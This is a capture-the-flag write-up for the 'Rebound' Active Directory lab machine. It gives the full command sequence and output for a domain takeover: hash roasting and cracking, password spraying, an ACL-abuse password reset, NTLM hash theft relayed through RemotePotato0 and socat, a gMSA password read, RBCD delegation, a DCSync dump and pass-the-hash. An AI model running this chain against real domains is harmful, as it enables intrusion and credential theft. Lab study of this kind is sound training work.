##### Tags: `AD`  `AS-REP Roasting`  `password spraying`  `bloodhound-python`  `bloodyAD`  `ntlm theft`  `rbcd` `PtH`

# 🪟 Rebound (AD)🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 10.129.232.31

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-09 20:25:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
Active Directory machine  
nxc found guest is a valid account with not password
```console
$ nxc smb 10.129.232.31 -u guest -p ''                  
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\guest: 
```
using guest account to brute force usernames and groups
```console
$ nxc smb 10.129.232.31 -u guest -p '' --rid-brute 50000
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.232.31   445    DC01             [+] rebound.htb\guest: 
SMB         10.129.232.31   445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.129.232.31   445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.129.232.31   445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.129.232.31   445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.129.232.31   445    DC01             514: rebound\Domain Guests (SidTypeGroup)
SMB         10.129.232.31   445    DC01             515: rebound\Domain Computers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             516: rebound\Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             517: rebound\Cert Publishers (SidTypeAlias)
SMB         10.129.232.31   445    DC01             518: rebound\Schema Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.232.31   445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             522: rebound\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.232.31   445    DC01             525: rebound\Protected Users (SidTypeGroup)
SMB         10.129.232.31   445    DC01             526: rebound\Key Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             527: rebound\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.232.31   445    DC01             553: rebound\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.232.31   445    DC01             571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.31   445    DC01             572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.31   445    DC01             1000: rebound\DC01$ (SidTypeUser)
SMB         10.129.232.31   445    DC01             1101: rebound\DnsAdmins (SidTypeAlias)
SMB         10.129.232.31   445    DC01             1102: rebound\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.232.31   445    DC01             1951: rebound\ppaul (SidTypeUser)
SMB         10.129.232.31   445    DC01             2952: rebound\llune (SidTypeUser)
SMB         10.129.232.31   445    DC01             3382: rebound\fflock (SidTypeUser)
SMB         10.129.232.31   445    DC01             5277: rebound\jjones (SidTypeUser)
SMB         10.129.232.31   445    DC01             5569: rebound\mmalone (SidTypeUser)
SMB         10.129.232.31   445    DC01             5680: rebound\nnoon (SidTypeUser)
SMB         10.129.232.31   445    DC01             7681: rebound\ldap_monitor (SidTypeUser)
SMB         10.129.232.31   445    DC01             7682: rebound\oorend (SidTypeUser)
SMB         10.129.232.31   445    DC01             7683: rebound\ServiceMgmt (SidTypeGroup)
SMB         10.129.232.31   445    DC01             7684: rebound\winrm_svc (SidTypeUser)
SMB         10.129.232.31   445    DC01             7685: rebound\batch_runner (SidTypeUser)
SMB         10.129.232.31   445    DC01             7686: rebound\tbrady (SidTypeUser)
SMB         10.129.232.31   445    DC01             7687: rebound\delegator$ (SidTypeUser)
```
put all username is a file user.txt  
AS-REP Roasting found a hash of ldap_monitor
```console
$ impacket-GetUserSPNs -no-preauth guest -usersfile user.txt -dc-host 10.129.232.31 rebound.htb/
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$643c9628897d6f4fd247b00753a29f57$81559e3d5e3ed42e0f938f1a612aa85e8d70cfed6bd0b7444cbbc46e8581117e26d2be67a08c938c8620ce18f9a297baaae66532989fdf08b124f8f830f4f94ca5038b0aa59015faf735b90408d1bdb5baa4e9f956e4118598567be72cb482dc9f5491fdb1e678517972ed89f47a5a6f2fd907d82499fab68c439e17e092913a14c937df07fc471c80dba750353602f0d4ee12200d393ed53a1ca12c894a6d489e502d451f2f7197129c06d33c2bc635f3c087aa4d7c6420cb041afadba5783a14c58872355231aaa5386add095c86f9e1bab0ac81a4b8e1501c2f301822bed04babce674edcc0e342232f5225811cd2e4eae35cd2ad54e3ca95ba6da2fe32616144557eeb065835e9d4526232f6455ccb0c7ae5b2960b62ff6405b00b5ed058837fb4b88fb8b8ac56ef633ce3bc49622f1796e4053554775e989306ab1c9ba592084aa0a5b8d99593ff4c2ac070dcc9363c0b878637a0ed80549469acee1309ff85ec3e5dcbb91e0e4a2d1d985d72c139eb3dc002feb0cf6c740bd1e8ae5ca5f2053c84d590e8e567d69c90511613cf9103a88313b70984ff594c32bcd1874e1ac68dba28516adb8f61404a377a4e05f14e4da94c6cc3ede07390436d9122593011755548fc7807eb052673b60ce4f538ed1d4ba3d7990cd9a914680dec6724889ba156c89f288c51279d61511ec074e38dde9d6782bd2a83f0ba8ffbd2ea10945a4f3210c233bdce4a22fc69349bd8a85abf2ea0e33b60e84a6e4f512528b0ec686341f82abe49421ebceefc53964bf4c9bf4460a0b4597265d7946000c89f60acb1d202bbc518169637601e3c45686cb9a9bdbd40b27f25c75ba0ac03ff3fdd273648c9c9a65091faf216004dee5d0599718e9d4bb153b2ffacf1a451ef1fe72ee46d04297ea05ad9cef177136206d3df36ec1ed66b4dc4aa99b3ae71846bcf7b6e2a3b1530e4c7c5a295813769279fd7deee8dede5c4dae82a97b38093b4db948f07bd5d54692110f9d53e71f60be211f265634ed5cde3ccb87a004aa618332419227388e43867d27736a7c21fa12df7a5af2076d0162e2b35fc602daeeea918f04f42b9c97759ca2137cc342b52ce3c37765c9172f8c7cefc560778c5518777e6eeeb501f132b227957ef0ea4b0e8aa14430a8a90068f96f46cea4de4e0f0002d9761a5b572dfcf8a88c40bc40d16d660215383ee5d0ab0a119cdf40d61cd8bc69fae314e391d8c3d19c028d956e4ad2e97821cccc8a442f2157867ef3b9ec303cc860e26a73f194b813b02bde0625751bc153fa27d0cc947878621709dd91a1c8b5c5f4277003895cc6e35e22f83
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
hastcat cracked it and got 1GR8t@$$4u
```console
$ hashcat -m 13100 hash.txt /home/ming/Downloads/rockyou.txt

1GR8t@$$4u
```
password spraying and found ldap_monitor and oorend share the same password
```console
$ nxc smb 10.129.232.31 -u user.txt -p '1GR8t@$$4u' --continue-on-success
SMB         10.129.232.31   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)                                                                                                        
SMB         10.129.232.31   445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.232.31   445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
```
since we have vaild domain username and password  
use bloodhound python to obtain the data of active directory
```console
$ bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc DC01.rebound.htb -c All -ns 10.129.232.31
```
## Attacking path  
bloodhound shows the user oorend can add itself to ServiceMgmt Group  
Service Mgmt Group has GenericAll over user winrm_svc  
winrm_svc can remote login to the machine  
  
Add oorend to ServiceMgmt group
```console
$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorend
[+] oorend added to ServiceMGMT
```
enable GenericAll privilege
```console
$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```
change password of winrm_svc
```console
$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'Password123' 
[+] Password changed successfully!
```
logged in as winrm_svc
```console
$ evil-winrm -i 10.129.232.31 -u 'winrm_svc' -p 'Password123'                                                                         
                                        
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
rebound\winrm_svc
```
## Lateral Movement
there is another user tbrady on the machine
```console
*Evil-WinRM* PS C:\Users> ls

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/28/2023   8:23 PM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----        8/22/2023  12:05 PM                tbrady
d-----         4/8/2023   2:08 AM                winrm_svc
```
bloodhound show tbrady has ReadGMSAPassword over Group DELEGATOR$  
when we run runascs.exe we can see tbrady is on this machine
```console
*Evil-WinRM* PS C:\temp> .\RunasCs.exe x x qwinsta -l 9

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           tbrady                    1  Active
```
we set network relay
```console
#Attacker machine

$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.232.31:9999
```
upload RemotePotato0.exe to steal the hash of tbrady
```console
# target machine

*Evil-WinRM* PS C:\temp> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.16.156 -p 9999
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ...
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : rebound\tbrady
NTLMv2 Hash     : tbrady::rebound:a23a72d30e54f146:bed234aadea628ce8d2b2073a6d3947d:0101000000000000216bcc64f228dd01a649d6975b5fb8ad0000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800216bcc64f228dd010600040006000000080030003000000000000000010000000020000012e2fa4ab743c6c1185b696021c25f45ceaa4feda2a5454acd5600e127f69b010a00100000000000000000000000000000000000090000000000000000000000
```
cracked the hash and we got tbrady:543BOMBOMBUNmanda
```console
$ john --wordlist=/home/ming/Downloads/rockyou.txt hash.txt      

543BOMBOMBUNmanda (tbrady)     
Session completed. 
```
## Privilege Escalation
use nxc to get the ntlm hash of delegator$
```console
$ nxc ldap 10.129.232.31 -u tbrady -p '543BOMBOMBUNmanda' -k --gmsa
LDAP        10.129.232.31   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
LDAPS       10.129.232.31   636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
LDAPS       10.129.232.31   636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.232.31   636    DC01             Account: delegator$           NTLM: 696b4aac5199179d5d20fb8755676777     PrincipalsAllowedToReadPassword: tbrady
```
from the account we owned, only ldap_monitor and delegator$ has SPN
```console
$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object oorend | grep servicePrincipalName 
                                                                                                                                                        
$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object ldap_monitor | grep servicePrincipalName
servicePrincipalName: ldapmonitor/dc01.rebound.htb
                                                                                                                                                        
$ bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' | grep servicePrincipalName
servicePrincipalName: browser/dc01.rebound.htb
```
use ldap_monitor to configures Resource-Based Constrained Delegation (RBCD) 
```console
$ impacket-rbcd 'rebound.htb/delegator$' -hashes :696b4aac5199179d5d20fb8755676777 -k -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -dc-ip 10.129.232.31 -use-ldaps
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ldap_monitor can now impersonate users on delegator$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ldap_monitor   (S-1-5-21-4078382237-1492182817-2568127209-7681)
```
Kerberos delegation attack
```console
$ impacket-getST 'rebound.htb/ldap_monitor:1GR8t@$$4u' -spn browser/dc01.rebound.htb -impersonate DC01$
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
```
chain or chain-request a Kerberos service ticket using Constrained Delegation based on an existing ticket cache
```console
$ impacket-getST -spn http/dc01.rebound.htb -impersonate 'DC01$' 'rebound.htb/delegator$' -hashes :696b4aac5199179d5d20fb8755676777 -additional-ticket DC01\$@browser_dc01.rebound.htb@REBOUND.HTB.ccache
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating DC01$
[*]     Using additional ticket DC01$@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache
```
dump the hashes using the ticket cache
```console
$ KRB5CCNAME='DC01$@http_dc01.rebound.htb@REBOUND.HTB.ccache' impacket-secretsdump -no-pass -k dc01.rebound.htb -just-dc-ntlm   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
```
Pass the hash login as administrator 
```console
$ evil-winrm -i 10.129.232.31 -u 'administrator' -H '176be138594933bb67db3b2572fc91b8'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
rebound\administrator
```
